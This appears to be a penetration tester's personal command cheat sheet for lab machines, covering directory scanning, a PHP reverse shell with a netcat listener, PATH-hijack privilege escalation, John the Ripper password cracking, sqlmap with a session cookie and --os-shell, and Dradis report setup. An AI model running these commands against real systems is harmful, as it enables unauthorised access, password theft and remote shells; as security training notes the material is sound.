!---DirSearch
	git clone https://github.com/maurosoria/dirsearch.git
	python3 dirsearch.py -u http://10.10.10.28 -e php
	
!---PHP Reverse Shell
	git clone https://github.com/pentestmonkey/php-reverse-shell
	#Modify file, change IP and port
	#Run NetCat
		sudo nc -l -p <port>
	
!---Relative Path Exploitation
	#If a program calls something from a relative location (doesn't specify the full path), you can exploit this by adding your current directory at the beginning of the path, then creating a script with the name of the program being called and put anything in it, such as /bin/bash or /bin/sh
	#Combined with SUID, this will allow you to get a shell as the user owner of the program
		PATH=./:$PATH
		echo '/bin/bash' > fakeprog
		chmod +x fakeprog

!---File enumeration
	#Search for files by group
		find / -type f -group <groupname> 2>/dev/null
			#/ #start in root
			#-type f #look for files
			#-group <groupname> #match any belonging to this group
			#2>/dev/null #send all error output to null instead of terminal

!---FTP commands
	#Switch to passive mode when only port 21 is allowed.  Use the command again for active mode
		passive
	
!---Password Bruteforce: John the Ripper
	#Extract the password has value from the file and store it to a file (called 'hashfile' here)
		zip2john <filename> > <hashfile>
	#Crack the password using the hash value in the file using a given dictionary file
		john <hashfile> --fork=4 -w=<dictionary>
			#--fork=4 #This tells it to use multiple processor cores (4 cores)
			#-w=<dictionary> #Specifies the dictionary file to use
	#See the results of the bruteforce for a given password protected file (not the hash file)
		john --show <filename>

!---SQL Injection Attacks
	#Scan a site for possible SQL injection vulnerabilities.  Requires a user-input URL
	sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=tp7g32eags5eia4ucfvkekrj8j"
		#-u 'http://10.10.10.46/dashboard.php?search=a' #This is the URL of a submission form where a SQL injection attack may occur.  It must include the user specifiable parameter in it with valid input
		#--cookie="PHPSESSID=tp7g32eags5eia4ucfvkekrj8j" #This is used to specify the session ID for an admin user that I obtained by logging in as the admin and was gathered from Burpsuite.
	
	sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=tp7g32eags5eia4ucfvkekrj8j" --os-shell

!---Wordpress Scanning
	#Install Wordpress Scanner
		git clone https://github.com/m4ll0k/WPSeku.git wpseku
		cd wpseku
		sudo pip3 install -r requirements.txt
	#Run scan
		python3 wpseku -u http://<URL>
		
!---Windows Exploits
	Juicy Potato - https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
	
	/home/coyote/Tools/juicy-potato

!---Dradis Setup
	sudo apt install dradis
	#Start app
	sudo dradis
	#Download templates from https://dradisframework.com/academy/industry/compliance/oscp/index.html
		Path to templates: /usr/lib/dradis/templates/notes/
		#Follow instructions to import as needed (I did Full Project Export, HTML Template, and Note Templates)
	Nodes
		Basically function like folders
	Notes
		Literally notes, these are not included on the exported report.  Good for noting things to circle back on
	Vulnerabilities
		Divided into two categories:
			Issues - These are the vulnerability listings.  This is general, not tied to a specific machine
				Evidence - These are instances of an issue, with specific IP's, ports, method of access, etc
					If a host has the same issue on multiple ports, each of those ports is separate evidence
	You need to keep spaces above the section headers for them to be read by the app properly

!---Timezone on Kali
	Use timedatectl:
		timedatectl list-timezones
		sudo timedatectl set-timezone <timezone>